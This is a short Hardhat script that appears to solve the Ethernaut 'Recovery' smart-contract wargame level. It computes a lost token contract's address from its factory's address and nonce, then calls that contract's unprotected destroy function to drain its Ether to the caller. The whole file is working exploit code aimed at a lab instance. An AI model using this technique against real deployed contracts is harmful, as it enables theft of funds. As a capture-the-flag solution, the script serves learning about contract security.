const hre = require("hardhat");

async function main() {
  const Victim = await ethers.getContractFactory("Recovery");
  const victim = await Victim.attach(
    "0xa88A84b009C1E6d9EDfa9b763E93607815282A73" // This is the contract address that you get from starting your instance
  );

  // Get the contract address of the contract that was created from the factory
  // You can also check in Etherscan
  const computedContractAddress = ethers.utils.getContractAddress({
    from: victim.address,
    nonce: hre.ethers.BigNumber.from(`1`),
  });

  console.log(
    "The address of the contract deployed is ",
    computedContractAddress
  );

  // Check what the balance contract is to drain it
  const provider = hre.ethers.provider;
  const initialBalance = await provider.getBalance(computedContractAddress); // we see that the contract has 0.001 Ether
  console.log(
    "The balance of the victim contract initially is ",
    initialBalance.toString()
  );

  // Now get the SimpleToken contract from the address obtained
  const MyContract = await ethers.getContractFactory("SimpleToken");
  const contract = await MyContract.attach(computedContractAddress);

  //Call the destroy function
  const attack = await contract.destroy(process.env.PUBLIC_KEY);
  await attack.wait(1);

  // Verify that the balance is 0
  const finalBalance = await provider.getBalance(computedContractAddress); // we see that the contract has 0.001 Ether
  console.log(
    "The balance of the victim contract now is ",
    finalBalance.toString()
  );
}

// Recommended pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
